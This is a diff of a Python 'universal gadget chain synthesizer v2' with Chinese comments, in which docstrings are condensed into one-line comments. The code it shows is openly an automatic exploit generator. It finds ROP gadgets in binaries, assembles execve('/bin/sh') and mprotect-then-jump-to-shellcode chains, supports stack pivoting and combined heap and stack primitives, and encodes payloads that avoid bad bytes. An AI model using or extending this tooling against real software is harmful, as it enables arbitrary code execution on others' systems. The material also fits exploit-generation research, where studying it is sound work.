@@ -1,18 +1,6 @@
 #!/usr/bin/env python3
-"""
-通用 Gadget 链合成器 v2
-
-基于 的多原语 漏洞利用 链合成框架
-支持任意 exploit 原语（栈、堆、任意位置）的自动化 gadget 链构建
-
-相比 v1 (rop_chain_synthesizer.py) 的改进：
-- 支持栈迁移（stack pivoting）的自动 gadget 选择
-- 条件执行 构件 的利用（cmp/je/jne + ret）
-- 多原语组合（堆溢出 + 栈溢出 → 单条利用链）
-- 坏字节感知的 ROP 载荷编码
-
-参考 的多漏洞组合利用策略
-"""
+# 通用 Gadget 链合成器 v2
+# 支持 stack pivoting / 条件执行构件 / 多原语组合 / 坏字节感知 ROP 载荷编码
 
 import logging
 import re
@@ -32,7 +20,6 @@ except ImportError:
 
 
 class PrimitiveType(Enum):
-    """exploit 原语类型"""
     STACK_OVERFLOW = auto()
     HEAP_OVERFLOW = auto()
     ARBITRARY_WRITE = auto()
@@ -45,7 +32,6 @@ class PrimitiveType(Enum):
 
 @dataclass
 class Gadget:
-    """ROP构件 描述，兼容 v1 的 构件 结构"""
     address: int
     instructions: List[str] = field(default_factory=list)
     category: str = ""
@@ -55,14 +41,12 @@ class Gadget:
 
 @dataclass
 class PivotGadget(Gadget):
-    """栈迁移 gadget"""
     new_sp_value: str = ""  # 新栈指针来源（如 'rax', 'rdx'）
     alignment_offset: int = 0
 
 
 @dataclass
 class ConditionalGadget(Gadget):
-    """条件执行 构件 (cmp/jmp/ret)"""
     condition: str = ""  # 'je', 'jne', 'jg', 'jl'
     then_gadget_addr: int = 0
     else_gadget_addr: int = 0
@@ -70,11 +54,7 @@ class ConditionalGadget(Gadget):
 
 @dataclass
 class ExploitChain:
-    """
-    完整 漏洞利用 链
-
-    由多个 stage 组成，最终实现任意代码执行
-    """
+    # 完整漏洞利用链，由多个 stage 组成，最终实现任意代码执行
     name: str
     target_primitive: PrimitiveType
     stages: List[List[Gadget]] = field(default_factory=list)
@@ -84,13 +64,7 @@ class ExploitChain:
 
 
 class GadgetFinder:
-    """
-    增强型 gadget 查找器
-
-    支持 的多原语 构件 分类
-    """
-
-    # 用于 gadget 分类的操作码签名
+    # 增强型 gadget 查找器，支持多原语构件分类
     _OP_SIGNATURES = {
         'pop_reg': [
             bytes([0x58]),  # pop rax
@@ -147,11 +121,7 @@ class GadgetFinder:
     def find_gadgets(
         self, data: bytes, base_addr: int = 0
     ) -> List[Gadget]:
-        """
-        在二进制数据中查找 ROP gadgets
-
-        返回所有以 ret 结尾的有效指令序列
-        """
+        # 在二进制数据中查找所有以 ret 结尾的有效 ROP gadgets
         if self._capstone:
             return self._find_with_capstone(data, base_addr)
 
@@ -298,12 +268,7 @@ class GadgetFinder:
 
 
 class ChainSynthesizer:
-    """
-    Exploit 链合成器
-
-    基于 [ARCANIST 2025] 的组合方法
-    自动将 gadget 组装为有效的 exploit 链
-    """
+    # exploit 链合成器，自动将 gadget 组装为有效的利用链
 
     def __init__(self, arch: str = 'x64'):
         self.arch = arch
@@ -313,13 +278,7 @@ class ChainSynthesizer:
     def synthesize_execve(
         self, gadgets: List[Gadget], target_cmd: str = '/bin/sh'
     ) -> Optional[ExploitChain]:
-        """
-        合成 execve 链
-
-        需要: pop rdi; ret, pop rsi; ret, pop rdx; ret, pop rax; ret, 系统调用; ret
-
-        如果缺少某些 gadget，尝试替代路径 [ARCANIST 2025]
-        """
+        # 合成 execve 链，需要 pop rdi/rsi/rdx/rax; ret + syscall; ret，缺失时尝试替代路径
         chain = ExploitChain(
             name='execve_chain',
             target_primitive=PrimitiveType.STACK_OVERFLOW,
@@ -386,12 +345,7 @@ class ChainSynthesizer:
         shellcode_addr: int,
         shellcode_len: int
     ) -> Optional[ExploitChain]:
-        """
-        合成 mprotect 链 → 壳代码 执行
-
-        mprotect(壳代码_page, page_size, PROT_READ|PROT_WRITE|PROT_EXEC)
-        → jmp 壳代码_addr
-        """
+        # 合成 mprotect 链：mprotect(shellcode_page, page_size, RWX) → jmp shellcode_addr
         chain = ExploitChain(
             name='mprotect_chain',
             target_primitive=PrimitiveType.STACK_OVERFLOW,
@@ -447,11 +401,7 @@ class ChainSynthesizer:
         gadgets: List[Gadget],
         constraints: Optional[Dict[str, Any]] = None
     ) -> List[ExploitChain]:
-        """
-        多原语组合合成 [ARCANIST 2025]
-
-        将不同类型的 exploit 原语组合为单一利用链
-        """
+        # 多原语组合合成，将不同类型 exploit 原语组合为单一利用链
         chains = []
 
         if PrimitiveType.STACK_OVERFLOW in primitives:
@@ -476,12 +426,7 @@ class ChainSynthesizer:
 
 
 class PayloadEncoder:
-    """
-    载荷编码器
-
-    将 exploit 链编码为可发送的字节载荷
-    处理坏字节、对齐和端序 [ARCANIST 2025]
-    """
+    # 载荷编码器，处理坏字节、对齐和端序
 
     def __init__(self, arch: str = 'x64', bad_bytes: Optional[Set[int]] = None):
         self.arch = arch
@@ -491,11 +436,7 @@ class PayloadEncoder:
     def encode_chain(
         self, chain: ExploitChain, padding_before: int = 0
     ) -> bytes:
-        """把漏洞利用链编码为 ROP payload。
-
-        chain 为漏洞利用链定义, padding_before 为 payload 之前
-        的填充字节数; 返回编码后的 payload 字节。
-        """
+        # 把漏洞利用链编码为 ROP payload，padding_before 为前导填充字节数
         payload = bytearray()
 
         # 填充
@@ -531,11 +472,7 @@ def synthesize_chain_v2(
     arch: str = 'x64',
     bad_bytes: Optional[List[int]] = None
 ) -> Dict[str, Any]:
-    """
-    便捷函数：通用 exploit 链合成（v2）
-
-    基于 [ARCANIST 2025] 和 [PBAEG 2025] 的方法
-    """
+    # 便捷函数：通用 exploit 链合成 v2
     g_list = [
         Gadget(
             address=g.get('address', 0),
